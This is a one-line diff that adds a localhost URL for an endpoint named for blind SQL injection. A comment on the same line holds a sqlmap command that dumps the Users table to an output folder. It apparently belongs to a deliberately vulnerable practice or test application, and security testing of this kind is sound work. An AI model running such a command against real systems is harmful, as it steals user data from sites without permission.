@@ -1,0 +1,1 @@
+http://localhost:44367/News/NewsBlindSqlInjection?id=1 (GET)  # c:/sqlmap/sqlmap.py -u http://localhost:44367/News/NewsBlindSqlInjection?id=1 --dump -T Users --output-dir=c:/sqlmap/output/
